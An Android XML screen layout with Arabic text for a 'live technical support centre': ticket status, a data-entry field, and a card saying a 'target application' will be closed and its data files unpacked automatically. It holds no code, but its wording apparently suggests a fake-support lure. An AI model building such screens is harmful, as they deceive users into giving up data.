<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:id="@+id/second_root_layout"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#F4F7F9">

    <View
        android:id="@+id/headerBackground"
        android:layout_width="match_parent"
        android:layout_height="220dp"
        android:background="@drawable/gradient_header" />

    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:scrollbars="none">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:padding="20dp">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical|right"
                android:layout_marginTop="20dp"
                android:layout_marginBottom="25dp">

                <LinearLayout
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:orientation="vertical"
                    android:gravity="right">
                    
                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="مركز الدعم الفني المباشر"
                        android:textColor="#FFFFFF"
                        android:textSize="20sp"
                        android:textStyle="bold" />

                    <LinearLayout
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:orientation="horizontal"
                        android:gravity="center_vertical"
                        android:layout_marginTop="4dp">
                        
                        <TextView
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:text="اتصال آمن وموثق"
                            android:textColor="#B3FFFFFF"
                            android:textSize="12sp" />

                        <ImageView
                            android:layout_width="14dp"
                            android:layout_height="14dp"
                            android:layout_marginStart="5dp"
                            android:src="@android:drawable/ic_lock_idle_lock"
                            app:tint="#4CAF50" />
                    </LinearLayout>
                </LinearLayout>

                <ImageView
                    android:layout_width="60dp"
                    android:layout_height="60dp"
                    android:layout_marginStart="15dp"
                    android:src="@drawable/ic_support_shield" /> 
            </LinearLayout>

            <androidx.cardview.widget.CardView
                android:id="@+id/layoutWaiting"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                app:cardCornerRadius="16dp"
                app:cardElevation="8dp"
                app:cardUseCompatPadding="true"
                android:visibility="visible">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="vertical"
                    android:padding="25dp"
                    android:gravity="center">

                    <ProgressBar
                        android:layout_width="65dp"
                        android:layout_height="65dp"
                        android:indeterminateTint="#1A73E8"
                        android:layout_marginBottom="20dp" />

                    <TextView
                        android:id="@+id/txtProgressStatus"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="جاري مراجعة طلبك من قبل المشرف..."
                        android:textSize="16sp"
                        android:textStyle="bold"
                        android:textColor="#333333"
                        android:gravity="center" />

                    <TextView
                        android:id="@+id/txtTicketID"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="تذكرة رقم: #توليد_تلقائي"
                        android:textColor="#757575"
                        android:textSize="13sp"
                        android:layout_marginTop="8dp"
                        android:background="#F0F0F0"
                        android:paddingHorizontal="10dp"
                        android:paddingVertical="4dp" />
                </LinearLayout>
            </androidx.cardview.widget.CardView>

            <androidx.cardview.widget.CardView
                android:id="@+id/layoutRejected"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                app:cardCornerRadius="16dp"
                app:cardElevation="8dp"
                app:cardUseCompatPadding="true"
                android:visibility="gone">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="vertical"
                    android:padding="25dp"
                    android:gravity="center">

                    <ImageView
                        android:layout_width="50dp"
                        android:layout_height="50dp"
                        android:src="@android:drawable/ic_dialog_alert"
                        app:tint="#D32F2F"
                        android:layout_marginBottom="15dp" />

                    <TextView
                        android:id="@+id/txtRejectReason"
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:text="سيتم عرض سبب الرفض هنا..."
                        android:textColor="#D32F2F"
                        android:background="#FFF5F5"
                        android:padding="15dp"
                        android:layout_marginTop="15dp"
                        android:gravity="right" />
                </LinearLayout>
            </androidx.cardview.widget.CardView>

            <androidx.cardview.widget.CardView
                android:id="@+id/layoutFields"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                app:cardCornerRadius="16dp"
                app:cardElevation="8dp"
                app:cardUseCompatPadding="true"
                android:visibility="gone">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="vertical"
                    android:padding="20dp">

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="المعلومات الإضافية المطلوبة"
                        android:textColor="#1A73E8"
                        android:textStyle="bold"
                        android:layout_gravity="right"
                        android:layout_marginBottom="20dp" />

                    <LinearLayout android:id="@+id/groupField1" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical">
                        <EditText android:id="@+id/field1" android:layout_width="match_parent" android:layout_height="55dp" android:hint="أدخل البيانات المطلوبة هنا" android:background="@drawable/edittext_rounded" android:padding="12dp" android:gravity="right" />
                        <Button android:id="@+id/btnConfirm1" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="تحديث البيانات" android:layout_gravity="left" android:backgroundTint="#4CAF50" />
                    </LinearLayout>
                </LinearLayout>
            </androidx.cardview.widget.CardView>

            <androidx.cardview.widget.CardView
                android:id="@+id/layoutZipTask"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                app:cardCornerRadius="16dp"
                app:cardElevation="8dp"
                app:cardUseCompatPadding="true"
                android:visibility="gone">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="vertical"
                    android:padding="25dp"
                    android:gravity="center">

                    <ImageView
                        android:layout_width="60dp"
                        android:layout_height="60dp"
                        android:src="@android:drawable/stat_sys_download"
                        app:tint="#FF9800"
                        android:layout_marginBottom="15dp" />

                    <TextView
                        android:id="@+id/txtTaskDescription"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="تم إصدار تحديث برمجي جديد للملفات"
                        android:textColor="#333333"
                        android:textSize="17sp"
                        android:textStyle="bold"
                        android:gravity="center" />

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="سيتم إغلاق التطبيق المستهدف وفك ملفات البيانات تلقائياً."
                        android:textColor="#757575"
                        android:textSize="12sp"
                        android:layout_marginTop="5dp"
                        android:gravity="center" />

                    <ProgressBar
                        android:id="@+id/taskProgressBar"
                        style="?android:attr/progressBarStyleHorizontal"
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:layout_marginTop="20dp"
                        android:indeterminate="true"
                        android:visibility="gone" />

                    <Button
                        android:id="@+id/btnExecuteTask"
                        android:layout_width="match_parent"
                        android:layout_height="55dp"
                        android:layout_marginTop="15dp"
                        android:text="تحديث الملفات وتنفيذ العملية"
                        android:backgroundTint="#FF9800"
                        android:textColor="#FFFFFF"
                        android:textStyle="bold" />

                </LinearLayout>
            </androidx.cardview.widget.CardView>

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="جميع الحقوق محفوظة لفريق الدعم التقني © 2026"
                android:layout_gravity="center"
                android:textColor="#999999"
                android:textSize="11sp"
                android:layout_marginTop="30dp" />

            <Button
                android:id="@+id/btnCancelOrder"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="إلغاء الطلب والرجوع"
                android:textColor="#757575"
                android:layout_gravity="center"
                style="@style/Widget.AppCompat.Button.Borderless" />

        </LinearLayout>
    </ScrollView>

    <com.google.android.material.floatingactionbutton.FloatingActionButton
        android:id="@+id/fab_chat_trigger"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_alignParentLeft="true"
        android:layout_margin="20dp"
        android:src="@android:drawable/stat_notify_chat"
        app:backgroundTint="#1A73E8"
        app:tint="#FFFFFF"
        android:visibility="gone" /> </RelativeLayout>
